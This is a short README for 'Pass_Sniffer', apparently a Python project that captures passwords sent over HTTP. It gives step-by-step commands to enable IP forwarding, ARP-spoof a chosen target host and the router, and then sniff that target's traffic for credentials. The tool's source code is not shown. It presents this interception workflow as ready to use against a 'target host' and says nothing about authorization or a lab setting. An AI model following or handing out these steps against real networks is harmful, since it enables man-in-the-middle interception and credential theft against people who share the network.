# Pass_Sniffer
password sniffer developed in python. (only for HTTP websites)

## Prerequisites
~ You need to have python installed inside your machine in order to run this scanner.

## How To Use
~ Fire up your terminal and type the following command.
```
git clone https://github.com/jeet-patel313/Pass_Sniffer.git
```
```
cd Pass_Sniffer
```
```
echo 1 >> /proc/sys/net/ipv4/ip_forward 
```
enter the following command to check your router's ip address:
```
netstat -nr
```
now find the ip address of your target host machine and run the arp_spoofer.py first
```
python3 arp_spoofer.py <router_ip> <target_ip>
```
now run the pass_sniffer.py in order to sniff the target host for possible credentials
```
python3 pass_sniffer.py
```

## Developer
* **Jeet Patel**
[![Linkedin](https://i.stack.imgur.com/gVE0j.png) LinkedIn](https://www.linkedin.com/in/i-am-dope/)
